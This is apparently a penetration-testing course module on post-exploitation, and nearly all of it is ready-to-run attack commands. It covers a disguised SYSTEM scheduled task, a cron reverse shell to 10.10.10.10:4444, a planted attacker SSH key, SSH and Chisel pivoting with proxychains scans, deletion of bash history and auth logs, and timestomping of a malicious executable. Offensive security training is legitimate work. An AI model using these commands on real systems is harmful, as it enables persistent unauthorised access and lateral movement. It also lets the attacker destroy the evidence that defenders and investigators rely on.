# Module 15: Post-Exploitation Examples

## 1. Persistence Mechanisms

### A. Scheduled Tasks (Windows)
Create a task to execute a reverse shell every minute as the SYSTEM user.
```cmd
schtasks /create /sc minute /mo 1 /tn "WindowsUpdateCheck" /tr "c:\temp\shell.exe" /ru SYSTEM
```

### B. Cron Jobs (Linux)
Add a cron job to establish a reverse shell every hour.
```bash
echo "0 * * * * root bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /etc/crontab
```

### C. SSH Keys (Linux)
Add your attacker public key to the compromised user's authorized_keys file for permanent, passwordless access.
```bash
# On attacker machine
ssh-keygen
cat ~/.ssh/id_rsa.pub

# On victim machine
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

## 2. Pivoting and Port Forwarding

### A. SSH Tunneling (Dynamic Port Forwarding)
Create a SOCKS proxy over SSH to access the internal network through the compromised host.
```bash
# On attacker machine
ssh -D 9050 user@10.10.10.20 -f -N

# Then configure proxychains (/etc/proxychains.conf) to use socks4 127.0.0.1 9050
proxychains nmap -sT -p 80,445 192.168.1.0/24
```

### B. Chisel (SOCKS Proxy)
Using Chisel when SSH is not available.

**On Attacker (Server):**
```bash
./chisel server -p 8000 --reverse
```

**On Compromised Host (Client):**
```bash
./chisel client 10.10.10.10:8000 R:socks
```
*This opens a SOCKS proxy on the attacker's machine port 1080 by default.*

### C. Port Forwarding (Local)
Forwarding a specific internal port (e.g., MySQL 3306) to the attacker machine.
```bash
ssh -L 3306:127.0.0.1:3306 user@10.10.10.20
# Now you can connect to localhost:3306 on the attacker machine to access the remote database.
```

## 3. Clearing Tracks

### A. Linux Log Deletion
```bash
# Clear bash history
cat /dev/null > ~/.bash_history
history -c

# Clear auth logs
cat /dev/null > /var/log/auth.log
```

### B. Windows Timestomping
Using PowerShell to match the modified date of a malicious payload to a legitimate file like `cmd.exe`.
```powershell
(Get-Item "C:\temp\malicious.exe").LastWriteTime = (Get-Item "C:\Windows\System32\cmd.exe").LastWriteTime
```
